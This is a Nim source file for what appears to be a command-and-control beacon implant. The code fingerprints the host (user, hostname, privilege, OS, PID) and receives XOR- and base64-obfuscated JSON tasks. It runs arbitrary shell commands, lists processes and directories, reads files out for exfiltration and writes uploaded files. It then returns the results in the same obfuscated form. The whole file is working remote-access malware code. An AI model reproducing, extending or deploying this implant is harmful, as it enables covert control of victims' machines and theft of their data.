import json
import std/strutils
import os
import osproc
import std/base64
import std/random
import std/options
import system
import posix


proc toString*(str: seq[uint8]): string =
  result = newStringOfCap(len(str))
  for ch in str:
    add(result, char(ch))


proc xorEncode*(key, data: string): seq[uint8] =
  var result: seq[uint8]
  if key.len == 0:
    for ch in data:
      result.add(uint8(int(ch)))
    return result

  var j = 0
  for i in countup(0, data.len - 1):
    if j == key.len:
      j = 0
    result.add(uint8(int(data[i])) xor uint8(int(key[j])))
    inc j

  result

const
  instructionMsgTag* = "INS"
  uuidMsgTag* = "UID"
  cmdMsgTag* = "CM"
  returnValueTag* = "RV"
  inputFileTag* = "IF"
  outputFileTag* = "OF"
  dataTag* = "DA"
  argsTag* = "AR"
  pidTag* = "PI"
  errorCodeTag* = "EC"

  beaconHashMsgTag* = "BH"
  listenerHashMsgTag* = "LH"
  usernameMsgTag* = "UN"
  hostnameMsgTag* = "HN"
  archMsgTag* = "ARC"
  privilegeMsgTag* = "PR"
  osMsgTag* = "OS"
  lastProofOfLifeMsgTag* = "POF"
  sessionsMsgTag* = "SS"
  internalIpsMsgTag* = "IIPS"
  processIdMsgTag* = "PID"
  additionalInfoMsgTag* = "ADI"

  emptyString* = ""
  zeroString* = "0"
  alphabetChars* = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
  privilegeHigh* = "high"
  privilegeLow* = "low"
  okMessage* = "OK."
  fileExistsMessage* = "File already exists."
  fileDoesNotExistMessage* = "File doesn't exist."
  fileReadFailureMessage* = "Failed to read file"
  fileWriteFailureMessage* = "Failed to write file"
  changeDirFailureMessage* = "Failed to change directory"
  missingSleepValueMessage* = "Missing sleep value"
  invalidSleepValueMessage* = "Invalid sleep value"
  unknownInstructionMessage* = "Unknown instruction"
  quotedEmptyPath* = "\"\""
  doubleQuoteString* = "\""
  escapedDoubleQuoteString* = "\"\""

  instructionLs* = "ls"
  instructionPs* = "ps"
  instructionCd* = "cd"
  instructionPwd* = "pwd"
  instructionDownload* = "download"
  instructionUpload* = "upload"
  instructionRun* = "run"
  instructionSleep* = "sleep"

when defined(windows):
  const
    shellExecutable* = "cmd.exe"
    shellFlag* = "/C"
    listDirectoryCommand* = "dir "
    processListCommand* = "tasklist"
else:
  const
    shellExecutable* = "bash"
    shellFlag* = "-c"
    listDirectoryCommand* = "ls -la "
    processListCommand* = "ps -aux"


type
  C2Message* = object
    instruction*: string
    cmd*: string
    returnValue*: string
    inputFile*: string
    outputFile*: string
    data*: string
    args*: string
    uuid*: string
    pid*: int
    errorCode*: Option[int]


type
    Beacon* = ref object of RootObj
        beaconHash*: string
        hostname*: string
        username*: string
        arch*: string
        privilege*: string
        os*: string
        listenerHash*: string
        lastProofOfLife*: string
        internalIps*: string
        processId*: string
        additionalInfo*: string
        sleepTimeMs*: int
        xorKey*: string

        tasks: seq[C2Message]
        taskResults*: seq[C2Message]


proc initBeacon*(self: Beacon) =

    var alphabet = alphabetChars
    randomize()
    var hash = emptyString
    for i in 0..32-1:
        hash = hash & alphabet[rand(len(alphabet)-1)]

    self.beaconHash = hash
    const size = 256

    let hostname = newString(size)
    var success = gethostname(hostname, size) == 0
    let nullPos = hostname.find('\0')
    self.hostname = hostname
    if nullPos != -1:
        let finalHostname = hostname.substr(0, nullPos - 1)
        self.hostname = finalHostname

    var uid = geteuid()
    var gid = getegid()

    var login: cstring
    login = getlogin()
    
    self.username = $login
    self.arch = hostCPU
    if gid==0 or uid==0:
        self.privilege = privilegeHigh
    else:
        self.privilege = privilegeLow
    self.os = hostOS
    self.sleepTimeMs = 1000
    self.listenerHash = emptyString
    self.lastProofOfLife = zeroString
    self.internalIps = emptyString
    self.processId = $getpid()
    self.additionalInfo = emptyString
    self.xorKey = emptyString
    self.tasks = @[]
    self.taskResults = @[]


proc encodeString(data: string): string =
  if data.len == 0:
    return emptyString
  encode(data.toOpenArrayByte(0, data.high))


proc decodeString(data: string): string =
  if data.len == 0:
    return emptyString
  try:
    return decode(data)
  except CatchableError:
    return emptyString


proc quotePathForShell(path: string): string =
  when defined(windows):
    if path.len == 0:
      return quotedEmptyPath
    result = doubleQuoteString
    for ch in path:
      if ch == '"':
        result.add(escapedDoubleQuoteString)
      else:
        result.add(ch)
    result.add(doubleQuoteString)
  else:
    result = quoteShell(path)


proc execShellCommand(command: string): string =
  if command.len == 0:
    return emptyString
  execProcess(shellExecutable, args=[shellFlag, command], options={poUsePath})


proc cmdToTasks*(self: Beacon, input: string) =
  if isEmptyOrWhitespace(input):
    return

  var decoded: string
  try:
    decoded = decode(input)
  except CatchableError:
    return

  let transformed = xorEncode(self.xorKey, decoded)
  let payload = toString(transformed)

  var jsonNode: JsonNode
  try:
    jsonNode = parseJson(payload)
  except JsonParsingError:
    return

  if jsonNode.kind != JArray:
    return

  for bundleNode in jsonNode:
    if bundleNode.kind != JObject:
      continue

    if bundleNode.hasKey(listenerHashMsgTag):
      self.listenerHash = bundleNode[listenerHashMsgTag].getStr()
    if bundleNode.hasKey(usernameMsgTag):
      self.username = bundleNode[usernameMsgTag].getStr()
    if bundleNode.hasKey(hostnameMsgTag):
      self.hostname = bundleNode[hostnameMsgTag].getStr()
    if bundleNode.hasKey(archMsgTag):
      self.arch = bundleNode[archMsgTag].getStr()
    if bundleNode.hasKey(privilegeMsgTag):
      self.privilege = bundleNode[privilegeMsgTag].getStr()
    if bundleNode.hasKey(osMsgTag):
      self.os = bundleNode[osMsgTag].getStr()
    if bundleNode.hasKey(lastProofOfLifeMsgTag):
      self.lastProofOfLife = bundleNode[lastProofOfLifeMsgTag].getStr()
    if bundleNode.hasKey(internalIpsMsgTag):
      self.internalIps = bundleNode[internalIpsMsgTag].getStr()
    if bundleNode.hasKey(processIdMsgTag):
      self.processId = bundleNode[processIdMsgTag].getStr()
    if bundleNode.hasKey(additionalInfoMsgTag):
      self.additionalInfo = bundleNode[additionalInfoMsgTag].getStr()

    let beaconHash = if bundleNode.hasKey(beaconHashMsgTag): bundleNode[beaconHashMsgTag].getStr() else: emptyString
    if beaconHash != self.beaconHash:
      continue

    if not bundleNode.hasKey(sessionsMsgTag):
      continue

    let sessions = bundleNode[sessionsMsgTag]
    if sessions.kind != JArray:
      continue

    for sessionNode in sessions:
      if sessionNode.kind != JObject:
        continue

      var message = C2Message(pid: -100, errorCode: none(int))

      if sessionNode.hasKey(instructionMsgTag):
        message.instruction = sessionNode[instructionMsgTag].getStr()
      if sessionNode.hasKey(cmdMsgTag):
        message.cmd = sessionNode[cmdMsgTag].getStr()
      if sessionNode.hasKey(argsTag):
        message.args = sessionNode[argsTag].getStr()
      if sessionNode.hasKey(uuidMsgTag):
        message.uuid = sessionNode[uuidMsgTag].getStr()
      if sessionNode.hasKey(pidTag):
        message.pid = sessionNode[pidTag].getInt()
      if sessionNode.hasKey(errorCodeTag):
        message.errorCode = some(sessionNode[errorCodeTag].getInt())

      if sessionNode.hasKey(returnValueTag):
        message.returnValue = decodeString(sessionNode[returnValueTag].getStr())
      if sessionNode.hasKey(inputFileTag):
        message.inputFile = decodeString(sessionNode[inputFileTag].getStr())
      if sessionNode.hasKey(outputFileTag):
        message.outputFile = decodeString(sessionNode[outputFileTag].getStr())
      if sessionNode.hasKey(dataTag):
        message.data = decodeString(sessionNode[dataTag].getStr())

      self.tasks.add(message)


proc execInstruction*(self: Beacon) =
  for task in self.tasks:
    var instruction = task.instruction
    var args = task.args
    var cmd = task.cmd
    var data = task.data
    var inputFile = task.inputFile
    var outputFile = task.outputFile
    var pid = task.pid

    var result = emptyString
    case instruction:
    of instructionLs:
      if cmd.len == 0:
        cmd = getCurrentDir()
      let safeCmd = quotePathForShell(cmd)
      result = execShellCommand(listDirectoryCommand & safeCmd)
    of instructionPs:
      result = execShellCommand(processListCommand)
    of instructionCd:
      try:
        setCurrentDir(cmd)
        result = getCurrentDir()
      except OSError:
        result = changeDirFailureMessage
    of instructionPwd:
      result = getCurrentDir()
    of instructionDownload:
      if fileExists(inputFile):
        try:
          var fileHandler = open(inputFile, fmRead)
          data = fileHandler.readAll()
          fileHandler.close()
          result = okMessage
        except IOError:
          result = fileReadFailureMessage
      else:
        result = fileDoesNotExistMessage
    of instructionUpload:
      if fileExists(outputFile):
        result = fileExistsMessage
      else:
        try:
          var fileHandler = open(outputFile, fmWrite)
          fileHandler.write(data)
          fileHandler.close()
          result = okMessage
        except IOError:
          result = fileWriteFailureMessage
    of instructionRun:
      result = execShellCommand(cmd)
    of instructionSleep:
      if not isEmptyOrWhitespace(cmd):
        try:
          self.sleepTimeMs = parseInt(cmd) * 1000
          result = okMessage
        except ValueError:
          result = invalidSleepValueMessage
      else:
        result = missingSleepValueMessage
    else:
      result = unknownInstructionMessage

    var taskResult = C2Message(
      instruction: instruction,
      cmd: cmd,
      args: args,
      data: data,
      inputFile: inputFile,
      outputFile: outputFile,
      pid: pid,
      uuid: task.uuid,
      returnValue: result,
      errorCode: none(int)
    )
    self.taskResults.add(taskResult)

  self.tasks.setLen(0)


proc taskResultsToCmd*(self: Beacon): string =
  var sessions = newJArray()

  for message in self.taskResults:
    var node = newJObject()
    if message.instruction.len > 0:
      node[instructionMsgTag] = %message.instruction
    if message.cmd.len > 0:
      node[cmdMsgTag] = %message.cmd
    if message.returnValue.len > 0:
      node[returnValueTag] = %encodeString(message.returnValue)
    if message.inputFile.len > 0:
      node[inputFileTag] = %encodeString(message.inputFile)
    if message.outputFile.len > 0:
      node[outputFileTag] = %encodeString(message.outputFile)
    if message.data.len > 0:
      node[dataTag] = %encodeString(message.data)
    if message.args.len > 0:
      node[argsTag] = %message.args
    if message.pid != -100:
      node[pidTag] = %message.pid
    if message.errorCode.isSome:
      node[errorCodeTag] = %message.errorCode.get()
    if message.uuid.len > 0:
      node[uuidMsgTag] = %message.uuid

    sessions.add(node)

  var bundle = newJObject()
  if self.beaconHash.len > 0:
    bundle[beaconHashMsgTag] = %self.beaconHash
  if self.listenerHash.len > 0:
    bundle[listenerHashMsgTag] = %self.listenerHash
  if self.username.len > 0:
    bundle[usernameMsgTag] = %self.username
  if self.hostname.len > 0:
    bundle[hostnameMsgTag] = %self.hostname
  if self.arch.len > 0:
    bundle[archMsgTag] = %self.arch
  if self.privilege.len > 0:
    bundle[privilegeMsgTag] = %self.privilege
  if self.os.len > 0:
    bundle[osMsgTag] = %self.os
  if self.lastProofOfLife.len > 0:
    bundle[lastProofOfLifeMsgTag] = %self.lastProofOfLife
  if self.internalIps.len > 0:
    bundle[internalIpsMsgTag] = %self.internalIps
  if self.processId.len > 0:
    bundle[processIdMsgTag] = %self.processId
  if self.additionalInfo.len > 0:
    bundle[additionalInfoMsgTag] = %self.additionalInfo
  if sessions.len > 0:
    bundle[sessionsMsgTag] = sessions

  var multi = newJArray()
  multi.add(bundle)

  let serialized = $multi
  let encrypted = xorEncode(self.xorKey, serialized)
  let encoded = encode(encrypted)

  self.taskResults.setLen(0)

  encoded
